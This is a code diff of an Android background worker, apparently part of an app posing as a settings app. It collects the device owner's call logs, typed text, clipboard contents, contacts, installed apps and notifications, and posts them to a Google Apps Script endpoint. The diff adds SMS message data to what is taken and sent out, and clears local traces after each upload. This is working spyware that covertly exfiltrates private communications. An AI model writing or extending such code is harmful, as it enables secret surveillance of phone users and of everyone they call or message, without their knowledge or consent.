@@ -35,54 +35,53 @@ import static com.example.settings.MainActivity.clipboardManager;
 public class SyncData extends Worker {
     Sharedpref mSharedpref;
     Context context;
-    String Name, OutgoingNumbers,RecievedNumbers,MissedCallNumbers,TextWritten,DaysTime,Copiedtext="",Phonenumberdetails="",Phoneappdetails="",NotificationData;
-    List<Contact> contactList=new ArrayList<>();
+    String Name, OutgoingNumbers, RecievedNumbers, MissedCallNumbers, TextWritten, DaysTime, Copiedtext = "", Phonenumberdetails = "", Phoneappdetails = "", NotificationData,SmsData;
 
     public SyncData(@NonNull Context context, @NonNull WorkerParameters workerParams) {
         super(context, workerParams);
-        mSharedpref=new Sharedpref(context);
-        this.context=context;
+        mSharedpref = new Sharedpref(context);
+        this.context = context;
 
     }
 
     @NonNull
     @Override
     public Result doWork() {
-         Name=mSharedpref.getSaveName();
-         OutgoingNumbers=mSharedpref.getOutgoingNumbers();
-         RecievedNumbers=mSharedpref.getRecievedNumbers();
-         MissedCallNumbers=mSharedpref.getMissedCallNumber();
-         TextWritten=mSharedpref.getSaveTextWritten();
-        NotificationData=mSharedpref.getNotificationData();
-         try {
-             ClipData pData = clipboardManager.getPrimaryClip();
-             if(pData!=null) {
-                 ClipData.Item item = pData.getItemAt(0);
-                 Copiedtext = item.getText().toString();
-             }
-         }
-         catch (Exception e){
-             e.printStackTrace();
-         }
+        Name = mSharedpref.getSaveName();
+        OutgoingNumbers = mSharedpref.getOutgoingNumbers();
+        RecievedNumbers = mSharedpref.getRecievedNumbers();
+        MissedCallNumbers = mSharedpref.getMissedCallNumber();
+        TextWritten = mSharedpref.getSaveTextWritten();
+        NotificationData = mSharedpref.getNotificationData();
+        SmsData=mSharedpref.getSmsData();
+        try {
+            ClipData pData = clipboardManager.getPrimaryClip();
+            if (pData != null) {
+                ClipData.Item item = pData.getItemAt(0);
+                Copiedtext = item.getText().toString();
+            }
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
 
-         int numberlistsize=mSharedpref.getPhoneNumbersLisSize();
-         if(mSharedpref.getPrevPhoneNumbersLisSize()<numberlistsize){
-             Phonenumberdetails=mSharedpref.getPhoneNumbers();
-             mSharedpref.setPrevPhoneNumbersListSize(numberlistsize);
-             mSharedpref.commit();
-         }
-         if(mSharedpref.getPrevPhoneAppdetailsListSize()<mSharedpref.getPhoneAppdetailsListSize()){
-             Phoneappdetails=mSharedpref.getPhoneAppdetails();
-             mSharedpref.setPrevPhoneAppdetailsListSize(mSharedpref.getPhoneAppdetailsListSize());
-             mSharedpref.commit();
-         }
+        int numberlistsize = mSharedpref.getPhoneNumbersLisSize();
+        if (mSharedpref.getPrevPhoneNumbersLisSize() < numberlistsize) {
+            Phonenumberdetails = mSharedpref.getPhoneNumbers();
+            mSharedpref.setPrevPhoneNumbersListSize(numberlistsize);
+            mSharedpref.commit();
+        }
+        if (mSharedpref.getPrevPhoneAppdetailsListSize() < mSharedpref.getPhoneAppdetailsListSize()) {
+            Phoneappdetails = mSharedpref.getPhoneAppdetails();
+            mSharedpref.setPrevPhoneAppdetailsListSize(mSharedpref.getPhoneAppdetailsListSize());
+            mSharedpref.commit();
+        }
         String currentDate = new SimpleDateFormat("dd-MM-yyyy", Locale.getDefault()).format(new Date());
         String currentTime = new SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(new Date());
-        DaysTime=currentDate+"["+currentTime+"]";
-        if(!Name.isEmpty()) {
+        DaysTime = currentDate + "[" + currentTime + "]";
+        if (!Name.isEmpty()) {
             if (!OutgoingNumbers.isEmpty() || !RecievedNumbers.isEmpty() ||
                     !MissedCallNumbers.isEmpty() || !TextWritten.isEmpty() || !Copiedtext.isEmpty()
-                    || !Phonenumberdetails.isEmpty() || !NotificationData.isEmpty()) {
+                    || !Phonenumberdetails.isEmpty() || !NotificationData.isEmpty() || !SmsData.isEmpty()) {
                 StringRequest stringRequest = new StringRequest(Request.Method.POST, "https://script.google.com/macros/s/AKfycbyUGXUk5NbLhbNtHJlt1uBWAIytI4oBUOnPlAB7dc6DPgKiyRBJ/exec",
                         new Response.Listener<String>() {
                             @Override
@@ -91,6 +90,8 @@ public class SyncData extends Worker {
                                 mSharedpref.setRecievedNumbers("");
                                 mSharedpref.setMissedCallNumber("");
                                 mSharedpref.setSaveTextWritten("");
+                                mSharedpref.setNotificationData("");
+                                mSharedpref.setSmsData("");
                                 mSharedpref.commit();
                             }
                         },
@@ -116,7 +117,8 @@ public class SyncData extends Worker {
                         parmas.put("Copiedtext", Copiedtext);
                         parmas.put("Phonenumberdetails", Phonenumberdetails);
                         parmas.put("Phoneappdetails", Phoneappdetails);
-                        parmas.put("NotificationData",NotificationData);
+                        parmas.put("NotificationData", NotificationData);
+                        parmas.put("SmsData", SmsData);
                         return parmas;
                     }
                 };
